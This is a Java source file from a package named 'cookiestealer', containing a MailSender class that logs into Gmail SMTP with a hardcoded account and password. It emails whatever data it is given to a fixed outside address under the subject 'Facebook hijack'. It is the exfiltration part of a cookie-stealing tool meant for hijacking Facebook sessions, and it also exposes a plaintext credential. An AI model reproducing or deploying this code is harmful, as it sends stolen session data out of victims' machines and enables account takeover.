package com.catthoor.cookiestealer.datatransfer;

import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class MailSender implements DataTransferrer {

    private final String username = "jcchrometest95@gmail.com";
    private final String password = "ditiseentest";
    private Properties properties;
    private Session session;

    public MailSender() {
        initProperties();
        initSession();
    }

    private void initProperties() {
        properties = new Properties();
        properties .put("mail.smtp.auth", true);
        properties .put("mail.smtp.starttls.enable", true);
        properties .put("mail.smtp.host", "smtp.gmail.com");
        properties .put("mail.smtp.port", "587");
    }

    private void initSession() {
        session = Session.getInstance(properties,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });
    }


    public void send(String data) {
        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress("jcchrometest95@gmail.com"));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse("jasper@catthoor.com"));
            message.setSubject("Facebook hijack");
            message.setText(data);
            Transport.send(message);
            System.out.println("Done");
        } catch (MessagingException e) {
            e.printStackTrace();
        }
    }
}
